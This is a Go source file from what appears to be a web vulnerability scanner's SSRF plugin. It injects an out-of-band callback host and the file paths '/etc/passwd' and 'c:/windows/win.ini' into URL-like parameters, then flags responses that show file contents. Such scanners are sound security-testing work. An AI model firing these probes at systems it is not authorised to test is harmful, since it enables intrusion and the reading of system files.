package ssrf

import (
	"github.com/thoas/go-funk"
	"github.com/yhy0/Jie/pkg/input"
	"github.com/yhy0/Jie/pkg/output"
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"github.com/yhy0/Jie/pkg/reverse"
	"github.com/yhy0/Jie/pkg/util"
	"github.com/yhy0/logging"
	"time"
)

/**
  @author: yhy
  @since: 2023/1/30
  @desc: //TODO
**/

// 参数中包含以下关键字的，进行 ssrf 测试
var sensitiveWords = []string{"url", "path", "uri", "api", "target", "host", "domain", "ip", "file"}

func Scan(crawlResult *input.CrawlResult) {
	params, err := httpx.ParseUri(crawlResult.Url, []byte(crawlResult.RequestBody), crawlResult.Method, crawlResult.ContentType, crawlResult.Headers)
	if err != nil {
		logging.Logger.Debug(err.Error())
		return
	}

	var ssrfHost string
	var dnslog *reverse.Reverse
	if crawlResult.IsSensorServerEnabled {
		flag := util.RandLowLetterNumber(8)
		dnslog = reverse.New("", flag)
		ssrfHost = dnslog.Url
	} else {
		ssrfHost = "https://www.baidu.com/"
	}

	if ssrf(crawlResult, params.SetPayload(crawlResult.Url, ssrfHost, crawlResult.Method, sensitiveWords), dnslog) {
		return
	}

	payloads := params.SetPayload(crawlResult.Url, "/etc/passwd", crawlResult.Method, sensitiveWords)

	if payloads != nil {
		payloads = append(payloads, params.SetPayload(crawlResult.Url, "c:/windows/win.ini", crawlResult.Method, sensitiveWords)...)
	} else {
		payloads = params.SetPayload(crawlResult.Url, "c:/windows/win.ini", crawlResult.Method, sensitiveWords)
	}

	readFile(crawlResult, payloads)
}

// ssrf
func ssrf(in *input.CrawlResult, payloads []string, dnslog *reverse.Reverse) bool {
	for _, payload := range payloads {
		res, err := httpx.Request(in.Url, in.Method, payload, false, in.Headers)
		if err != nil {
			logging.Logger.Errorln(err)
			continue
		}

		isVul := false
		if in.IsSensorServerEnabled {
			isVul = reverse.Check(dnslog, 5)
		} else {
			isVul = funk.Contains(res.Body, "www.baidu.com/img/sug_bd.png")
		}

		if isVul {
			output.OutChannel <- output.VulMessage{
				DataType: "web_vul",
				Plugin:   "SSRF",
				VulnData: output.VulnData{
					CreateTime: time.Now().Format("2006-01-02 15:04:05"),
					Target:     in.Url,
					Method:     in.Method,
					Ip:         in.Ip,
					Param:      in.Kv,
					Request:    res.RequestDump,
					Response:   res.ResponseDump,
					Payload:    payload,
				},
				Level: output.Critical,
			}
			return true
		}

	}

	logging.Logger.Debugf("ssrf vulnerability not found")
	return false
}

// readFile 任意文件读取
func readFile(in *input.CrawlResult, payloads []string) {
	for _, payload := range payloads {

		res, err := httpx.Request(in.Url, in.Method, payload, false, in.Headers)
		if err != nil {
			logging.Logger.Errorln(err)
			continue
		}
		if funk.Contains(res.Body, "root:x:0:0:root:/root:") || funk.Contains(res.Body, "root:[x*]:0:0:") || funk.Contains(res.Body, "; for 16-bit app support") {
			output.OutChannel <- output.VulMessage{
				DataType: "web_vul",
				Plugin:   "READ-FILE",
				VulnData: output.VulnData{
					CreateTime: time.Now().Format("2006-01-02 15:04:05"),
					Target:     in.Url,
					Method:     in.Method,
					Ip:         in.Ip,
					Param:      in.Kv,
					Request:    res.RequestDump,
					Response:   res.ResponseDump,
					Payload:    payload,
				},
				Level: output.Critical,
			}
			return
		}

	}

	logging.Logger.Debugf("read file vulnerability not found")
}
